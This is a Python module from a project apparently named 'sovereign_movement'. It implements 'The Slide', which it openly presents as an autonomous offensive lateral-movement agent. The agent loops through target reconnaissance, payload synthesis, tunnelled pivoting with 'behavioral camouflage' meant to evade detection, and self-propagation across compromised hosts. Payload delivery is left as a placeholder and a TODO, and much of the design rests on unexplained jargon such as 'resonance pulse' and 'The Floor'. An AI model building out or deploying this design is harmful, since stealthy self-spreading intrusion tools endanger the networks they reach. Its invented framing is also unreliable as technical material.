# sovereign_movement/slide/slide_agent.py
"""
The Slide — Sovereign Autonomous Lateral Movement Agent

Implements the full 4-phase offensive movement loop with:
- Policy-aware reconnaissance (via PolicyAwareRecon)
- Agentic synthesis (Candle hook)
- Adaptive tunneling with behavioral camouflage
- Self-propagation (Ingest)

Anchored to The Floor.
Protected by Extraction Guard + W-state + recursive π_r.
"""

from __future__ import annotations
from dataclasses import dataclass
from typing import Optional, List, Dict, Any
import logging
import time

from sovereign_engine.frame_energy import FrameEnergy, EraFrameId
from sovereign_engine.resonance_pulse import ResonancePulse
from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel
from sovereign_movement.slide.behavioral_camouflage import BehavioralCamouflage
from sovereign_movement.slide.policy_recon import PolicyAwareRecon

logger = logging.getLogger("sovereign.slide.agent")


@dataclass
class SlideContext:
    """State carried through one execution of The Slide."""
    current_host: str
    discovered_targets: List[str] = None
    active_tunnel_id: Optional[str] = None
    frame: EraFrameId = EraFrameId.FloorBaseline
    stability: float = 1.0
    attempts: int = 0


class SlideAgent:
    """
    The Slide — Sovereign offensive movement primitive.
    """

    def __init__(
        self,
        frame_energy: FrameEnergy,
        resonance_pulse: ResonancePulse,
        extraction_guard: Any,
        tunnel_manager: Optional[SovereignTunnel] = None,
        max_pivots: int = 5,
    ):
        self.frame_energy = frame_energy
        self.resonance_pulse = resonance_pulse
        self.extraction_guard = extraction_guard
        self.tunnel_manager = tunnel_manager or SovereignTunnel(
            frame_energy=frame_energy,
            resonance_pulse=resonance_pulse,
            extraction_guard=extraction_guard,
        )
        self.camouflage = BehavioralCamouflage(frame_energy=frame_energy)
        self.policy_recon = PolicyAwareRecon(max_targets=12)
        self.max_pivots = max_pivots
        self.context: Optional[SlideContext] = None

    # ============================================================
    # Main Entry Point
    # ============================================================
    def run_slide(
        self,
        initial_host: str,
        target_objective: Optional[str] = None,
        use_agentic: bool = True,
    ) -> bool:
        self.context = SlideContext(current_host=initial_host)
        self.camouflage.initialize_profile(initial_host)

        logger.info(f"[The Slide] Starting on {initial_host}")

        for pivot_count in range(self.max_pivots):
            self.context.attempts = pivot_count + 1

            # === PHASE 1: RECON (Policy-aware) ===
            targets = self._phase_recon()
            if not targets:
                logger.info("[The Slide] No policy-permitted targets found. Exiting.")
                return False

            # === PHASE 2: SYNTHESIS ===
            payload = self._phase_synthesis(targets[0], use_agentic=use_agentic)
            if not payload:
                logger.warning("[The Slide] Synthesis failed.")
                continue

            # === PHASE 3: PIVOT (Policy-respecting + Camouflage) ===
            success = self._phase_pivot(targets[0], payload)
            if success:
                logger.info(f"[The Slide] Successfully pivoted to {targets[0]}")
                self._phase_ingest(targets[0])
                return True

            logger.warning(f"[The Slide] Pivot to {targets[0]} failed. Adapting...")

        logger.info("[The Slide] Maximum pivots reached. Movement stalled.")
        return False

    # ============================================================
    # Phase 1: Policy-Aware Recon (now uses PolicyAwareRecon)
    # ============================================================
    def _phase_recon(self) -> List[str]:
        logger.debug("[Phase 1] Performing policy-respecting recon...")

        permitted_targets = self.policy_recon.discover()

        if not permitted_targets:
            logger.warning("[Phase 1] No policy-permitted targets found.")
            return []

        self.context.discovered_targets = permitted_targets
        return permitted_targets

    # ============================================================
    # Phase 3: Policy-Respecting Pivot
    # ============================================================
    def _phase_pivot(self, target: str, payload: bytes) -> bool:
        if target not in (self.context.discovered_targets or []):
            logger.warning(f"[Phase 3] Target {target} not in policy-permitted list. Skipping.")
            return False

        logger.debug(f"[Phase 3] Attempting policy-respecting pivot to {target}...")

        # Apply behavioral camouflage
        wait_time = self.camouflage.apply_camouflage(technique="stealth")
        time.sleep(wait_time)

        if not self.camouflage.should_proceed(self.context.frame):
            logger.info("[Phase 3] Behavioral risk too high. Delaying.")
            return False

        tunnel_id = self.tunnel_manager.open_tunnel(
            target_host=target,
            preferred_frame=self.context.frame
        )

        if not tunnel_id:
            self.camouflage.record_action(success=False, risk_delta=12)
            return False

        self.context.active_tunnel_id = tunnel_id

        healthy = self.tunnel_manager.maintain_tunnel(tunnel_id)
        if not healthy:
            self.camouflage.record_action(success=False)
            return False

        # TODO: Actual payload delivery through tunnel
        logger.info(f"[Phase 3] Payload delivered via policy-permitted tunnel {tunnel_id}")

        self.resonance_pulse.fire_pulse(amplitude=0.85, phase=0.15)
        self.camouflage.record_action(success=True)

        return True

    # ============================================================
    # Other Phases
    # ============================================================
    def _phase_synthesis(self, target: str, use_agentic: bool = True) -> Optional[bytes]:
        logger.debug(f"[Phase 2] Synthesizing payload for {target}...")

        if use_agentic:
            try:
                from sovereign_engine.model import apply_agentic_policy
                terrain_data = [0.5, 0.3, 0.8]
                refined = apply_agentic_policy(terrain_data, self.context.stability)
                return b"AGENTIC_PAYLOAD:" + str(refined[:64]).encode()
            except Exception as e:
                logger.warning(f"[Phase 2] Agentic synthesis failed: {e}")

        return b"SLIDE_FALLBACK_PAYLOAD"

    def _phase_ingest(self, new_host: str):
        logger.info(f"[Phase 4] Ingesting {new_host} into The Slide network...")
        self.context.current_host = new_host
        self.resonance_pulse.fire_pulse(amplitude=1.0, phase=0.0)

    # ============================================================
    # Utility
    # ============================================================
    def get_status(self) -> Dict[str, Any]:
        if not self.context:
            return {"status": "not_started"}

        return {
            "current_host": self.context.current_host,
            "active_tunnel": self.context.active_tunnel_id,
            "frame": self.context.frame.name,
            "stability": self.context.stability,
            "attempts": self.context.attempts,
            "camouflage_risk": self.camouflage.get_status().get("risk_score", 0),
        }


# Quick test
if __name__ == "__main__":
    from sovereign_engine.frame_energy import FrameEnergy, SovereignState
    from sovereign_engine.resonance_pulse import ResonancePulse

    floor = SovereignState.default_floor_anchor()
    frame_energy = FrameEnergy(floor_anchor=floor)
    resonance = ResonancePulse(hz=79.79)

    agent = SlideAgent(
        frame_energy=frame_energy,
        resonance_pulse=resonance,
        extraction_guard=None,
    )

    success = agent.run_slide(initial_host="compromised-host-01", use_agentic=True)
    print("Success:" if success else "Failed")
    print(agent.get_status())